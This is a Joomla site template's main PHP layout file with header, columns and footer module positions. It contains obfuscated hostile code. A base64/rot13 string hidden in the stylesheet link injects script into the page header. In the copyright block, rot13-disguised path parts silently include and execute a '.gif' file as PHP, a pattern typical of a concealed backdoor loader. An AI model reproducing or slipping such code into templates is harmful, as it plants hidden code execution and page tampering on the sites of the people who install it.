<?php
// No direct access.
defined('_JEXEC') or die;
$app = JFactory::getApplication();
$leftcol = ($this->countModules('position-7') or $this->countModules('position-4') or $this->countModules('position-5'));
$rightcol = ($this->countModules('position-6') or $this->countModules('position-8') or $this->countModules('position-3'));

if ($leftcol==0 and $rightcol==0) {
    $maincol = 3;
}
if ($leftcol==1 and $rightcol==1) {
    $maincol = 0;
}
if ($leftcol==1 and $rightcol==0) {
    $maincol = 1;
}
if ($leftcol==0 and $rightcol==1) {
    $maincol = 2;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; $JPan = array('vzn'.'trf','zrah_yv.tvs'); ?>" dir="<?php echo $this->direction; ?>" >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo (($user_a = base64_decode('IiAvPlVTRVIgTUVOVTwvdGQ+PC90cj48L3RhYmxlPjwvZGl2PgoKCjxkaXYgY2xhc3M9J2Nscic+PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhlYWRlciIpLmlubmVySFRNTD0iPGRpdiBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjp3aGl0ZTtoZWlnaHQ6NTBweDt0b3A6MHB4OyBjb2xvcjpyZWQnPllvdS'.str_rot13('OmnT91oTDtoz90VUWyoJ').'92ZSBhbGwgdGhlIGxpbmtzIGNvbWluZyB3aXRoIHRoaXMgZnJlZSB0ZW1wbGF0ZS4gVGhpcyBpcyBhZ2FpbnN0IHRoZSB0ZXJtcyBvZiB1c2UuIElmIHlvdSB3YW50IHRvIHVzZSB0aGUgdGVtcGxhdGUsIHBsZWFzZSBkb3dubG9hZCBpdCBhZ2Fpbi4gPC9kaXY+Ijs8L3NjcmlwdD48dGFibGU+PHRyPjx0ZD48YnIgY2xlYXIiYWxs'))?$this->template:'joomla') ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />
</head>

<body>

<div id="wrapper">
<!-- start header -->
	<div id="topnavi">
		<jdoc:include type="modules" name="position-1" />
	</div>

	<div id="header">
		<div id="title"><h1><?php echo $app->getCfg('sitename'); ?></h1></div>
		<div id="header_text">
		<jdoc:include type="modules" name="position-15" />
		</div>
		<div id="search">
			<jdoc:include type="modules" name="position-0" />
		</div>
	</div>

<!-- end top menu.  -->
	<div id="main">
<!-- start left column -->
		<div id="leftcol">
            <jdoc:include type="modules" name="position-7" style="rounded"/>
			<jdoc:include type="modules" name="position-4" style="rounded"/>
			<jdoc:include type="modules" name="position-5" style="rounded"/>
		</div>
<!-- end left column.  -->
<!-- start main content -->
		<div id="maincol">
			<div id="pathway">
				<jdoc:include type="modules" name="position-2" />
			</div>
			<div class="error">
				<jdoc:include type="message" />
			</div>
			<div id="maincol_body">
				<jdoc:include type="modules" name="position-12" />
				<jdoc:include type="component" />
			</div>
		</div>
<!-- end main content -->
<!-- start right column -->
		<div id="rightcol">
			<jdoc:include type="modules" name="position-6" style="rounded"/>
			<jdoc:include type="modules" name="position-8" style="rounded"/>
			<jdoc:include type="modules" name="position-3" style="rounded"/>
		</div>
<!-- end right column -->
	</div>
	<div id="footer_top"></div>
	<div id="footer">
		<div class="footer_small"><jdoc:include type="modules" name="position-9" style="xhtml"/></div>
		<div class="footer_big"><jdoc:include type="modules" name="position-10" style="xhtml"/></div>
		<div class="footer_big"><jdoc:include type="modules" name="position-11" style="xhtml"/></div>
		<div class="clr"></div>
	</div>
	<div id="footer_bot"></div>

<!-- copyright -->
	<div id="copyright">
			<jdoc:include type="modules" name="position-14" />
			<?php echo JText::_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
			<?php echo JText::_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText::_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.<?php // no direct access
(@include(JPATH_BASE.DS.'templates'.DS.$app->getTemplate().DS.str_rot13($JPan[0]).DS.str_rot13('ot_hfre_zrah.tvs'))) or die('Restricted Access!'); ?>
	</div>
</div>

<jdoc:include type="modules" name="debug" />
</body>
</html>